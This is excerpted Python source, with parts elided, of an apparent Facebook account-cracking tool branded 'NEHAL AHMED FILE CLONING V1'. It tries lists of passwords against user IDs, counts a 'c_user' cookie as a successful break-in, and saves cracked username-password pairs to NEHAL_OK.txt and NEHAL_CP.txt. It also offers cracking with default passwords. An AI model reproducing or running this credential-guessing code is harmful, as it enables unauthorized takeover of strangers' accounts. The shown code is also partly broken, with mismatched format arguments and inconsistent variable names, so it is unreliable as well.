...
\033[1;98m█ ##    ## ######## ##     ## ##     ## ######## █
\033[1;99m╚════════════════════════════════════════════════╝
 \033[1;91m                     NEHAL AHMED FILE CLONING V1
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mNEHAL_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mNEHAL_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back Nehal Menu ")
	    meithun()
...
def meithun():
    ...
    IP = ipm['origin']
    print
    print('\033[1;93m [N] High Speed File Cloning (V1)')
    print(' [E] exit ')
    print('')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[NEHAL] {loop} | {len(self.id)} [ok] < > [{len(ok)}] < > [cp] < > [{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [NEHAL-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('NEHAL_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [NEHAL-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('NEHAL_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        print('[D] Crack With Default Pass (V1)')
